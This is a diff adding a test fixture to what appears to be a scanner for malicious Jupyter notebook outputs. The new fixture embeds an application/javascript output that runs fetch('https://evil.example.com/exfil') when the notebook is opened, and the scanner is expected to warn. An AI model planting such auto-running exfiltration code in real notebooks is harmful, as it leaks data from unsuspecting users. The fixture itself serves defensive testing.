@@ -99,6 +99,17 @@ expected_action = "warn"
 expected_rules = ["notebook_suspicious_output"]
 
 [[fixture]]
+name = "notebook_application_javascript_output"
+min_milestone = 3
+# An `application/javascript` output MIME bundle — executable content the
+# notebook renderer runs when the notebook is opened.
+input = "{\"cells\":[{\"cell_type\":\"code\",\"source\":\"render()\",\"outputs\":[{\"output_type\":\"display_data\",\"data\":{\"application/javascript\":[\"fetch('https://evil.example.com/exfil')\"]}}]}]}"
+context = "file"
+file_path = "notebook.ipynb"
+expected_action = "warn"
+expected_rules = ["notebook_suspicious_output"]
+
+[[fixture]]
 name = "notebook_normal_dataframe_output_clean"
 min_milestone = 3
 # A pandas DataFrame renders as an HTML <table> — perfectly normal output.
